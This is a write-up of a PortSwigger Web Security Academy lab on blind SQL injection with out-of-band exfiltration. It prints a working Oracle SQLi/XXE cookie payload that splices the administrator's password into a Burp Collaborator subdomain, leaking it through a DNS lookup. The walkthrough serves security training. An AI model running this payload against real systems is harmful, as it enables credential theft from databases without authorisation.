# Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration

**Platform:** PortSwigger Web Security Academy

## What's going on here

Lab 16 confirmed the database could reach out to an external server at all. This one goes further — instead of just proving an interaction happens, the actual password gets smuggled out inside the Collaborator subdomain itself. The DNS lookup becomes the exfiltration channel: whatever data gets stitched into the domain name shows up in Burp Collaborator's logs, no in-band response required.

## 🎯 Target

Exfiltrate the administrator's password directly through a Collaborator DNS/HTTP interaction.

## The bypass

Same XXE-over-SQLi mechanism as Lab 16, but this time the subquery result — the password itself — gets concatenated straight into the subdomain being resolved:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--


![Modified TrackingId cookie with the password subquery spliced into the subdomain](images/lab17-step1-payload.png)

The `||` concatenation drops the subquery's result directly in front of the Collaborator subdomain, so the entity resolution isn't just pinging a fixed address — it's resolving `<password>.your-collaborator-subdomain`. Whatever the password is becomes part of the hostname the database looks up.

Inserted the real Collaborator subdomain the same way as before (right-click → **Insert Collaborator payload**), sent the request, then went to the **Collaborator tab** and hit **Poll now** — the interaction fires asynchronously, so it doesn't show up instantly.

![Collaborator tab showing the DNS interaction with the password embedded in the subdomain](images/lab17-step2-collaborator-leak.png)

## Result

The interaction log showed the full resolved domain name — with the administrator's password sitting right there as the subdomain prefix. Logged in immediately with it.

![Full domain name in the interaction log revealing the password](images/lab17-step3-password-revealed.png)

## Takeaway

Out-of-band interaction isn't just a confirmation tool — concatenating real data into the callback address turns it into a full exfiltration channel. This is often the last resort in real-world blind SQLi when the app gives away nothing in-band at all: no errors, no timing differences, no visible content changes. As long as the database can be made to reach out, and real data can be spliced into that outbound request, the data gets out regardless.

---

This closes out the blind SQLi chapter — messages, errors, timing, and now out-of-band, all covered. One thing left in this path: SQLi doesn't always fail cleanly when it's blocked by input filtering, and encoding tricks can slip past those filters entirely: **[Lab 18 — SQL Injection with Filter Bypass via XML Encoding](lab-18-xml-encoding-bypass.md)**.
